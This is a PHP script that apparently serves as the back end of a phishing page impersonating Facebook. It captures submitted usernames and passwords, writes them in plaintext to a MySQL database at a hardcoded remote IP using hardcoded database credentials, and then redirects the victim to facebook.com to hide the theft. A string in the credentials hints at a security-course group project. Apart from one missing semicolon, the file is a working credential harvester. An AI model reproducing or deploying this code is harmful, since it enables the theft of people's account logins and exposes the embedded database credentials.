<?php
$host = "72.167.87.111"; // Change this to your MySQL host
$username = "users"; // Change this to your MySQL username
$password = "CECS378group8"; // Change this to your MySQL password
$dbname = "userinput"; // Change this to your MySQL database name

// Create a new MySQLi instance and connect to the database
$conn = new mysqli($host, $username, $password, $dbname);

// Check for errors
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

// Get the form data
$userName = $_POST["userName"];
$passWord = $_POST["passWord"];

// Prepare the SQL statement with placeholders for the form data
$sql = "INSERT INTO users (userName, passWord) VALUES (?, ?)";

// Prepare the statement and bind the form data to the placeholders
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $userName, $passWord);

// Execute the statement
if ($stmt->execute()) {
  //redired to new page
  header("Location: https://www.facebook.com")
  exit();
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close the statement and connection
$stmt->close();
$conn->close();
?>
